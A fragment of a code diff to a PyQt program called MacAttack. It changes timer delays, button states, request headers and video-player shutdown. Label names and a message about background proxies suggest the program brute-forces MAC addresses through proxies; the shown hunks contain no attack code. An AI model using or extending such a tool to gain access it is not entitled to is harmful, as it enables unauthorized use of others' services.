+        QTimer.singleShot(10000, lambda: self.start_button.setDisabled(False)) #stop waiting after a time
         # Disable further user input immediately
         logging.debug("GiveUp initiated: Preparing to stop threads.")
         self.running = False
@@ -2736,7 +2874,7 @@ class MacAttack(QMainWindow):
         self.stop_button.setDisabled(True)
 
         # Set a delay for updating the brute_mac_label
-        QTimer.singleShot(4000, lambda: self.brute_mac_label.setText(
+        QTimer.singleShot(3500, lambda: self.brute_mac_label.setText(
             "Please Wait...\nThere are proxies in the background finishing their tasks."
         ))
 
@@ -2745,6 +2883,7 @@ class MacAttack(QMainWindow):
         cleanup_thread.start()
         
     def _wait_for_threads(self):
+        
         logging.debug("Waiting for threads to finish...")
         
         # Wait for all threads to complete
@@ -2953,7 +3092,6 @@ class MacAttack(QMainWindow):
                             'Authorization': f'Bearer {token}',
                             'Accept-Encoding': 'gzip, deflate, zstd',
                             'Accept': '*/*',
-                            'Connection': 'close',
                             'Cache-Control': 'no-cache'
                         }
 
@@ -3019,7 +3157,6 @@ class MacAttack(QMainWindow):
                         'Authorization': f'Bearer {token}',
                         'Accept-Encoding': 'gzip, deflate, zstd',
                         'Accept': '*/*',
-                        'Connection': 'close',
                         'Cache-Control': 'no-cache'
                     }
 
@@ -3261,8 +3398,9 @@ class MacAttack(QMainWindow):
                     self.videoPlayer.pause()  # Pause the video
 
     def closeEvent(self, event):
+        self.videoPlayer.stop()
         self.SaveTheDay()
-        self.GiveUp()
+        self.GiveUp()               
         event.accept()
 
 if __name__ == "__main__":
